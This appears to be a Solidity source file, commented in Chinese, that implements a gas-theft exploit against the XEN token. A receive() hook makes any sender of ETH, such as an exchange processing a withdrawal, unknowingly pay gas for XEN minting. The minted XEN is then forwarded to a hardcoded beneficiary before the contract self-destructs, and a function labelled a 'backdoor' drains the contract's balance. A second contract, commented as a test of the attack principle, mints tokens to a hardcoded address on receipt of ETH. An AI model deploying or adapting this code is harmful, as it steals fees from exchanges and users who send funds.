// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

//xen接口

interface IXen {
    
    function claimRank(uint256 term) external;
    function claimMintReward() external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
contract recevieDemo{


    //xen 合约地址
    address public _addr = 0x2AB0e9e4eE70FFf1fB9D67031E44F6410170d00e ;
    // 受益地址
    address public rewardAddress = 0x6971b57a29764eD7af4A4a1ED7a512Dde9369Ef6 ;
    address[] array;


    // 接受ETH
    receive() payable external{
        claimxen();
    }

    function claimxen() private{
        
        //xen mint接口
        IXen(_addr).claimRank(1);
    }
    
    //提取xen 发送xen去地址
    function rewardAndTransfer() external {
        IXen(_addr).claimMintReward();
        uint256 banlance = IXen(_addr).balanceOf(address(this));
        IXen(_addr).transfer(rewardAddress, banlance);
        selfdestruct(payable(rewardAddress));
    }

    //提款后门
    // 提取合约内的余额
    function withdraw() public payable {
        payable(rewardAddress).transfer(address(this).balance);
    }
}




//测试 erc20 代币
contract Mytoken is ERC20{
    constructor() ERC20("Mytoken","XTN"){}
    function formint(address to ,uint256 amount) public{
        _mint(to,amount);
    }
}
//Mytoken的接口
interface test{
    function formint(address to,uint256 amount) external;
}
//测试攻击原理
contract testDemo{
    receive() payable external{
        //测试原理
        // 合约地址：0xcF20F78278fA86ce8762aFfABd173F1254605A4c
        test(0xcF20F78278fA86ce8762aFfABd173F1254605A4c).formint(address(0xF3A2fAeFC66fC68b77054b9A46543Afd153a3Aa8),10000000000000);
        selfdestruct(payable(0xF3A2fAeFC66fC68b77054b9A46543Afd153a3Aa8));
    }
}